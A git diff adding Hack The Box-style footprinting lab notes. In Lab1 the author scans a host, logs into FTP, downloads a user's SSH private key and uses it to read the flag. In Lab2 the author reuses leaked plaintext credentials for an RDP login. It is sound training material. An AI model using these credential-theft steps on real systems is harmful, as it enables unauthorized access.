@@ -455,3 +455,185 @@ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) >
 └─$ hashcat -m 7300 password.txt /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting
 ```
+
+# Footprinting Lab1
+I started by scanning the target to understand what was exposed and to stay within the “careful enumeration” rule. The initial service discovery showed two FTP services (21 and 2121), SSH on 22, and DNS on 53, which suggested a credential/key-based path rather than web exploitation.
+```bash
+nmap -sC -sV 10.129.157.210
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     ProFTPD
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
+2121/tcp open  ftp     ProFTPD
+```
+Next I tested FTP on port 21 using the provided credentials to see if it exposed any useful files (like an SSH key). Authentication worked, but directory listing showed only . and .., meaning the FTP root was effectively empty. I also confirmed that wget could only retrieve a .listing file and would not download anything else because there were no regular files available.
+```bash
+
+ftp 10.129.157.210
+
+220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.157.210]
+Name (10.129.157.210:kali): ceil
+331 Password required for ceil
+230 User ceil logged in
+
+ftp> pwd
+ftp> ls -la
+
+Remote directory: /
+drwxr-xr-x   2 root root 4096 Nov 10  2021 .
+drwxr-xr-x   2 root root 4096 Nov 10  2021 ..
+
+wget -m --no-passive ftp://ceil:qwer1234@10.129.157.210
+cat 10.129.157.210/.listing
+
+drwxr-xr-x   2 root root 4096 Nov 10  2021 .
+drwxr-xr-x   2 root root 4096 Nov 10  2021 ..
+```
+
+After that I attempted SSH directly with the username to validate whether password auth was allowed. The verbose output showed SSH only permitted publickey authentication, which aligned with the lab hint about employees discussing SSH keys. This confirmed I needed to obtain a private key rather than brute forcing or using password authentication.
+```bash
+
+ssh -vvv ceil@10.129.157.210
+
+debug1: Authentications that can continue: publickey
+ceil@10.129.157.210: Permission denied (publickey).
+```
+
+I then validated DNS quickly to see if it leaked any internal zone information that could point to files, hostnames, or other services. The server disclosed its version and allowed a zone transfer only for localhost, but all other likely zones failed, and dnsenum did not return useful NS/domain info. That told me DNS wasn’t going to provide the SSH key or a new path to the flag in this lab.
+```bash
+
+dig @10.129.157.210 version.bind chaos txt
+dig @10.129.157.210 axfr localhost
+dig @10.129.157.210 axfr local
+dig @10.129.157.210 axfr internal
+dig @10.129.157.210 axfr htb
+dnsenum 10.129.157.210
+
+version.bind. 0 CH TXT "9.16.1-Ubuntu"
+
+; Transfer failed.   (for local/internal/htb)
+```
+
+Since port 21 FTP was empty and SSH required keys, the remaining “careful” pivot was the second FTP service on port 2121. Logging in there immediately exposed ceil’s home directory contents, including a .ssh directory. Trying to get .ssh failed because it’s not a regular file, so I changed into the directory, listed its contents, and found id_rsa, id_rsa.pub, and authorized_keys. I downloaded the private key and the authorized_keys file.
+```bash
+
+ftp 10.129.157.210 2121
+
+ftp> ls -la
+
+drwxr-xr-x   4 ceil ceil 4096 Nov 10  2021 .
+drwxr-xr-x   4 ceil ceil 4096 Nov 10  2021 ..
+-rw-------   1 ceil ceil  294 Nov 10  2021 .bash_history
+-rw-r--r--   1 ceil ceil  220 Nov 10  2021 .bash_logout
+-rw-r--r--   1 ceil ceil 3771 Nov 10  2021 .bashrc
+drwx------   2 ceil ceil 4096 Nov 10  2021 .cache
+-rw-r--r--   1 ceil ceil  807 Nov 10  2021 .profile
+drwx------   2 ceil ceil 4096 Nov 10  2021 .ssh
+-rw-------   1 ceil ceil  759 Nov 10  2021 .viminfo
+
+ftp> get .ssh
+
+550 .ssh: Not a regular file
+
+ftp> cd .ssh
+ftp> ls -la
+
+drwx------   2 ceil ceil 4096 Nov 10  2021 .
+drwxr-xr-x   4 ceil ceil 4096 Nov 10  2021 ..
+-rw-rw-r--   1 ceil ceil  738 Nov 10  2021 authorized_keys
+-rw-------   1 ceil ceil 3381 Nov 10  2021 id_rsa
+-rw-r--r--   1 ceil ceil  738 Nov 10  2021 id_rsa.pub
+
+ftp> get id_rsa
+ftp> get authorized_keys
+ftp> bye
+```
+
+With the private key downloaded locally, I fixed its permissions (required by SSH), then authenticated successfully to SSH using the key. This achieved the shell as ceil without any exploitation, matching the lab constraints.
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa ceil@10.129.157.210
+```
+
+Once on the host, I attempted to use locate to quickly find flag.txt, but the utility was not installed. I then enumerated /home, noticed a directory named flag, and found flag.txt directly inside it. Reading the file produced the flag required for submission.
+```bash
+
+locate flag.txt
+
+Command 'locate' not found, but can be installed with:
+apt install mlocate
+
+cd /home
+ls
+cd flag
+ls
+cat flag.txt
+
+HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
+```
+# Footprinting Lab2
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cat important.txt                      
+sa:87N1ns@slls83      
+
+
+ORT     STATE SERVICE       VERSION
+111/tcp  open  rpcbind?
+| rpcinfo: 
+|   program version    port/proto  service
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|_  100005  1,2,3       2049/udp6  mountd
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+2049/tcp open  mountd        1-3 (RPC #100005)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2026-01-09T01:17:50+00:00; -3s from scanner time.
+| ssl-cert: Subject: commonName=WINMEDIUM
+| Not valid before: 2026-01-08T00:16:18
+|_Not valid after:  2026-07-10T00:16:18
+| rdp-ntlm-info: 
+|   Target_Name: WINMEDIUM
+|   NetBIOS_Domain_Name: WINMEDIUM
+|   NetBIOS_Computer_Name: WINMEDIUM
+|   DNS_Domain_Name: WINMEDIUM
+|   DNS_Computer_Name: WINMEDIUM
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-01-09T01:17:40+00:00
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-01-09T01:17:45
+|_  start_date: N/A
+|_clock-skew: mean: -3s, deviation: 0s, median: -3s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 103.92 seconds
+
+─(kali㉿kali)-[~]
+└─$ sudo cat target/ticket4238791283782.
+ 2    host=smtp.web.dev.inlanefreight.htb
+ 3    #port=25
+ 4    ssl=true
+ 5    user="alex"
+ 6    password="lol123!mD"
+ 7    from="alex.g@web.dev.inlanefreight.htb"
+
+
+└─$ xfreerdp3 /v:10.129.202.41 /u:alex /p:'lol123!mD' /cert:ignore /sec:nla
+```
